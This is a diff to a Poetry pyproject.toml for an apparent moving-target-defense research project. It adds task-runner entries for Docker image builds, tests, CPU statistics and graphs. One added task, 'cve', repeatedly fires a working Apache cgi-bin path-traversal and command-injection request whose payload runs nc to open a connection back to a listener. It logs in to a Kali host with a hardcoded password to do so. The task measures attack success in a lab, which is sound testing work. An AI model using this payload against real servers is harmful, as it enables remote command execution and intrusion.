@@ -12,9 +12,10 @@ docker = "^6.1.3"
 pydbus = "^0.6.0"
 pygobject = "^3.48.2"
 pyroute2-nftables = "^0.6.13"
+pandas = "^2.2.2"
+matplotlib = "^3.9.2"
 
 [tool.poetry.group.dev.dependencies]
-poethepoet = "^0.24.0"
 behave = "^1.2.6"
 coverage = "^7.5.3"
 
@@ -25,8 +26,156 @@ build-backend = "poetry.core.masonry.api"
 [tool.poetry.scripts]
 mass = "mass.main:main"
 
+
 [tool.poe.tasks]
 images = ["nginx"," httpd"]
-nginx = "docker build -f mass/nginx/Dockerfile -t nginx ."
-httpd = "docker build -f mass/httpd/Dockerfile -t httpd ."
+nginx = "sudo -E docker build -f mass/nginx/Dockerfile -t nginx ."
+httpd = "sudo -E docker build -f mass/httpd/Dockerfile -t httpd ."
 check = "python -m compileall mass/"
+test = "sudo -E poetry run behave tests/features/"
+coverage = "sudo -E poetry run coverage run -m behave"
+
+[tool.poe.tasks.cve]
+shell = """
+nc -lnvp 4444 -k > $out 2>&1 &
+PID_NC=$!
+poe mass --lower $lower --upper $upper &
+PID_MASS=$!
+sleep 5
+for i in $(seq 1 $n); do
+  sshpass -p 'kali' ssh kali@192.168.161.128 'curl "192.168.161.133/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo; nc 172.17.0.1 4444"> /dev/null 2>&1'
+  sleep 1
+done
+kill $PID_MASS
+kill $PID_NC
+total=$(grep "Connection received on" $out | wc -l) 
+echo "$total/$n" > $out
+"""
+  [[tool.poe.tasks.cve.args]]
+  name = "n"
+  default = 200
+  help = "Numero de intentos"
+  [[tool.poe.tasks.cve.args]]
+  name = "out"
+  help = "output filename"
+  default = "cve_results.txt"
+  [[tool.poe.tasks.cve.args]]
+  name = "upper"
+  help = "Upper time for the time bounds"
+  default = "15"
+  [[tool.poe.tasks.cve.args]]
+  name = "lower"
+  help = "Lower time for the time bounds"
+  default = "15"
+
+
+[tool.poe.tasks.all-scenarios]
+shell = """
+poe cve --out tests/results/cve_results_u15_l15.csv --upper 15 --lower 15 --n 250
+poe cve --out tests/results/cve_results_u20_l15.csv --upper 20 --lower 15 --n 250
+poe cve --out tests/results/cve_results_u20_l20.csv --upper 20 --lower 20 --n 250
+poe full-run --out tests/results/mtd-no-petition_u15_l15.csv --upper 15 --lower 15
+poe full-run --out tests/results/mtd-no-petition_u20_l15.csv --upper 20 --lower 15
+poe full-run --out tests/results/mtd-no-petition_u20_l20.csv --upper 20 --lower 20
+"""
+
+[tool.poe.tasks.full-run]
+shell = "poe check; poe images; poe stats --interval $interval --out $out; poe mass --upper $upper --lower $lower; poe kill-stats; poe graph --in $out --out $out.png"
+
+  [[tool.poe.tasks.full-run.args]]
+  name = "duration"
+  default = 300
+  help = "Tiempo total en segundos"
+  [[tool.poe.tasks.full-run.args]]
+  name = "interval"
+  help = "Intervalo que pasa entre toma de estadisticas (en segundos)"
+  default = 1
+  [[tool.poe.tasks.full-run.args]]
+  name = "out"
+  help = "output filename"
+  [[tool.poe.tasks.full-run.args]]
+  name = "upper"
+  help = "Upper time for the time bounds"
+  default = "15"
+  [[tool.poe.tasks.full-run.args]]
+  name = "lower"
+  help = "Lower time for the time bounds"
+  default = "11"
+
+
+
+[tool.poe.tasks.graph]
+shell="python graph.py $in $out"
+
+  [[tool.poe.tasks.graph.args]]
+  name = "in"
+  help = "CSV to read"
+
+  [[tool.poe.tasks.graph.args]]
+  name = "out"
+  help = "output filename"
+  default = "graph.png"
+
+[tool.poe.tasks.kill-stats]
+shell = """
+  STATS_PID=$(cat .stats_pid)
+  if [ -z "$(eval echo \\$$STATS_PID)" ]; then
+    echo "There is not .stats_pid file"
+  else
+    sudo -E kill $STATS_PID
+    rm .stats_pid
+    if [ $? -eq 0 ]; then
+      echo "The stats collector was finished succesfully"
+    else
+      echo "There was a problem closing the stats collector"
+    fi
+  fi
+"""
+
+
+[tool.poe.tasks.mass]
+shell = "sudo -E poetry run mass --duration $duration --lower $lower --upper $upper"
+  [[tool.poe.tasks.mass.args]]
+  name = "duration"
+  help = "Tiempo total en segundos"
+  default = "300"
+  [[tool.poe.tasks.mass.args]]
+  name = "upper"
+  help = "Upper time for the time bounds"
+  default = "15"
+  [[tool.poe.tasks.mass.args]]
+  name = "lower"
+  help = "Lower time for the time bounds"
+  default = "11"
+
+[tool.poe.tasks.stats]
+shell = """
+  init_time=$(date +"%Y-%m-%d_%H-%M-%S")
+  if [ -n "$out" ]; then
+    output="$out"
+  else 
+    output="stats.$init_time.csv"
+  fi
+  echo "TIME;CPU;" > "$out"
+  if [ $duration -eq 0 ]; then
+    sar -u $interval 1000000 | awk '{if ($8 != "") { gsub(",", ".", $8); usage=100-$8; printf "%s;%.2f;\\n", $1, usage; fflush(); }}' >> "$out" &
+  else
+    timeout $duration sar -u $interval 1000000 | awk '{if ($8 != "") { gsub(",", ".", $8); usage=100-$8; printf "%s;%.2f;\\n", $1, usage; fflush(); }}' >> "$out" &
+  fi
+  echo $PYTHON_CODE
+  STATS_PID=$!
+  echo PID: $STATS_PID
+  echo $STATS_PID > .stats_pid
+"""
+
+  [[tool.poe.tasks.stats.args]]
+  name = "duration"
+  default = 0
+  help = "Tiempo total en segundos"
+  [[tool.poe.tasks.stats.args]]
+  name = "interval"
+  help = "Intervalo que pasa entre toma de estadisticas (en segundos)"
+  default = 1
+  [[tool.poe.tasks.stats.args]]
+  name = "out"
+  help = "output filename"
